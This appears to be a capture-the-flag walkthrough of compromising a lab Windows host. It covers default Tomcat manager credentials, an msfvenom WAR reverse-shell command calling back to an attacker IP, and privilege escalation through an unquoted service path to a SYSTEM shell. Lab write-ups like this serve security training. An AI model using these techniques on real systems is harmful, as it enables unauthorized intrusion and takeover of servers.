First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.13`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/29e73950-cab4-49ef-94ea-700b04f059d8/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/29e73950-cab4-49ef-94ea-700b04f059d8/Untitled.png)

Quite a few ports to look at.  First thing that I see that catches my eye is Tomcat running on port 8080.  Lets check this out and see what we find.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ae507099-dfb9-4392-8940-b2f3bcc9a65c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ae507099-dfb9-4392-8940-b2f3bcc9a65c/Untitled.png)

Looks like we have a default page with some information disclosure on the version of Tomcat running.  I looked for any vulnerabilities for Tomcat 7.0.88 and found a couple of possibilities but couldn't get them to work so I put them on the back burner.  I decided to fuzz for directories which didn't returned much but it did return a few results as we can see here.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e8dc1163-1a01-4081-bfdf-7a38ed05c678/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e8dc1163-1a01-4081-bfdf-7a38ed05c678/Untitled.png)

The manager directory looks interesting, lets check that out.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1bd47201-3a74-4a57-9d1a-13bb53b0ce0b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1bd47201-3a74-4a57-9d1a-13bb53b0ce0b/Untitled.png)

We have a place to log in,  I tried a few common creds like admin:admin with no luck.  I then searched for tomcat default creds and for this list on GitHub

[https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)

If we go through this list, we will find that the default creds of **tomcat:s3cret** work and we are now logged into the manager.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33c29dff-37a4-4c54-b6a9-617ad7112718/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33c29dff-37a4-4c54-b6a9-617ad7112718/Untitled.png)

If we scroll down, we see a place to upload a **.war** file.  This is perfect as we should be able to upload a malicious war file that can get us a shell on the machine.  Lets generate one with **msfvenom**

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.11 LPORT=1337 -f war > shell.war`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81471837-8371-4809-be3e-1fee87d78e3c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81471837-8371-4809-be3e-1fee87d78e3c/Untitled.png)

Once we upload our file to the server we will see it under Applications

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5492593e-1210-4688-ab9f-a79244bc54cd/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5492593e-1210-4688-ab9f-a79244bc54cd/Untitled.png)

Now we just need to start a netcat listener and click on the application to execute on the server.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/597f7525-1820-444c-b309-dc68099fd5ea/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/597f7525-1820-444c-b309-dc68099fd5ea/Untitled.png)

We now have a shell!  Now lets see if we can escalate our privileges.

I started with transferring over **WinPEAS** to the machine and found an unquoted service path that we may be able to abuse.  We can also see that we have access to create files in a directory within the path of this service executable.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/85e88a1e-c1ad-43be-9007-124bff2ccdb6/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/85e88a1e-c1ad-43be-9007-124bff2ccdb6/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7c687b15-a5e6-4415-96a9-73646bb745be/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7c687b15-a5e6-4415-96a9-73646bb745be/Untitled.png)

We can query more information about this service with **sc qc Deploy**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eb005d38-1b47-4dbc-a248-83ca6363cf79/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eb005d38-1b47-4dbc-a248-83ca6363cf79/Untitled.png)

As we can see, this services seems to be running with system permissions.  Since we can see from the WinPEAS output that we can write to the **C:\Program Files\Deploy Ready** directory, we should be able to create a malicious file called **Service.exe** within this directory.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9b88eae5-a2ba-4e59-829f-e877f5ad669e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9b88eae5-a2ba-4e59-829f-e877f5ad669e/Untitled.png)

Now we can execute this file by starting the service with **net start Deploy** and obtain a shell as system

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/776c12e8-4550-4541-a247-74ea69427278/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/776c12e8-4550-4541-a247-74ea69427278/Untitled.png)
